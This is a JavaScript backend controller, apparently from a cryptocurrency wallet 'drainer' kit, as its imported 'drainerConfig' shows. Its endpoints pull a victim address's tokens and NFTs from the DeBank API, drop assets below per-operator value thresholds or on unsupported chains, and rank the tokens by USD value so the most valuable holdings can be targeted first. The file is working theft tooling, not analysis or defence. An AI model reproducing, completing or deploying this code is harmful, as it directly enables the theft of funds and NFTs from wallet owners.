import { ethers } from "ethers";

import deBankApi from "../apis/deBankApi.js";
import drainerConfig from "../config/drainer.js";
import wallets from "../utils/wallets.js";
import web3services from "../services/web3services.js";

const getTokens = async (req, res) => {
  try {
    const user = req.user;
    const address = req.query.address;
    const tokens = await deBankApi.getTokens(address);

    let filtered_tokens = tokens.filter(
      (token) => token["is_verified"] && token["is_core"] && token["is_wallet"]
    );

    filtered_tokens = filtered_tokens.filter(
      (token) => token.price * token.amount >= (user?.minTokenBalance || 10)
    );

    filtered_tokens = filtered_tokens.filter((token) =>
      Object.keys(drainerConfig.CHAINS).includes(token.chain)
    );

    filtered_tokens = filtered_tokens.map((filtered_token) => {
      filtered_token.raw_amount = String(filtered_token.raw_amount);
      filtered_token.balance = filtered_token.amount * filtered_token.price;
      filtered_token.type = "token";
      if (!filtered_token.id.startsWith("0x")) filtered_token.id = "MAIN_TOKEN";
      return filtered_token;
    });

    const sorted_tokens = filtered_tokens.sort(
      (tokenA, tokenB) => tokenB["balance"] - tokenA["balance"]
    );

    return res.status(200).send(sorted_tokens);
  } catch (error) {
    console.log(error);
    const errorMessage = "Something went wrong when trying to get user tokens";
    res.status(500).send(errorMessage);
  }
};

const getNFTs = async (req, res) => {
  try {
    const user = req.user;
    const address = req.query.address;
    const NFTs = await deBankApi.getNFTs(address);

    let filtered_NTFs = NFTs.filter(
      (nft) => nft.usd_price * nft.amount >= user.minNftBalance
    );

    filtered_NTFs = filtered_NTFs.filter((token) =>
      Object.keys(drainerConfig.CHAINS).includes(token.chain)
    );

    const payload = filtered_NTFs.map((filtered_NFT) => {
      filtered_NFT.price = filtered_NFT.usd_price;
      filtered_NFT.type = "nft";
      filtered_NFT.standart = filtered_NFT.is_erc721 ? "Erc721" : "Erc1155";
      return filtered_NFT;
    });

    res.send(payload);
  } catch (error) {
    console.log(error);
    const errorMessage = "Something went wrong when trying to get user nfts";
    res.status(500).send(errorMessage);
  }
};

const getTokenPrice = async (req, res) => {
  try {
    const contract = req.query.contract;
    const chain_id = req.query.chain_id;
    const token = await deBankApi.getTokenPrice(chain_id, contract);

    const payload = {
      tokenPrice: token.price,
      tokenName: token.name,
      tokenDecimals: token.decimals,
    };

    return res.status(200).send(payload);
  } catch (error) {
    console.log(error);
    const errorMessage = "Something went wrong when trying to get user tokens";
    res.status(500).send(errorMessage);
  }
};

export default {
  getNFTs,
  getTokens,
  getTokenPrice,
};
